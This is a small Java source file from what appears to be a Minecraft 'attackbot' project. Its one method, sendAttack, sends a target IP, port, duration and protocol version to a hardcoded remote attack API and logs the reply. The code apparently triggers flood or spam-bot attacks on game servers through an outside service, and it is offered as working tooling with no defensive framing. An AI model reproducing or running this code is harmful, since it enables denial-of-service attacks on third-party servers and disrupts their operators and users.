package org.mcspam.attackbot.main.mcspam;

import org.mcspam.attackbot.utils.LogUtils;
import org.mcspam.attackbot.utils.WebUtils;

/**
 * Created by origi on 12/16/2017.
 */
public class MCSpamAPI {
    public void sendAttack(String ip, String port, String time, String protocol) {
        String api = String.format("http://185.224.131.119/api.php?host=%s&port=%s&time=%s&version=%s", ip, port, time, protocol);

        // Send Attack
        String response = WebUtils.getRequest(api);
        LogUtils.debug("API SEND ATTACK", "GET (" + api + ") Response: " + response);
    }
}
